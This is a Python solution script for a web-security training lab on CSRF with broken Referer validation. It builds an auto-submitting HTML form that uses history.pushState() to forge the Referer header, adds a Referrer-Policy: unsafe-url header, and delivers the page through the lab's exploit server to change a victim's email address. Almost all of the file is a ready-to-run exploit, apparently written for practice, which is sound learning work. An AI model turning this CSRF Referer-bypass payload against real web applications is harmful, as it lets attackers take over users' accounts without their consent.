####################################################################################
# 
# Lab: CSRF with broken Referer validation
#
# Hack Steps: 
#      1. Add the `Referrer-Policy` header to your exploit server response headers
#      2. Craft an HTML form for changing the email address with an auto-submit
#         script that changes the Referer header value using the 
#         history.pushState() method
#      3. Deliver the exploit to the victim
#      4. The victim's email will be changed after they trigger the exploit
#
####################################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ae5009603abbdc6802ea313007e00f1.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0af600db0391bd5080e1a27001aa0030.exploit-server.net"

def main():
    new_email = "hacked@you.com" # You can change this to what you want
    payload = f"""<html>
                    <body>
                    <form action="{LAB_URL}/my-account/change-email" method="POST">
                        <input type="hidden" name="email" value="{new_email}" />
                        <input type="submit" value="Submit request" />
                    </form>
                    <script>
                        history.pushState('', '', '/?{LAB_URL}');
                        document.forms[0].submit();
                    </script>
                    </body>
                </html>"""
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nReferrer-Policy: unsafe-url"
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    post_data(EXPLOIT_SERVER_URL, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(url, data):
    try:    
        return requests.post(url, data)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()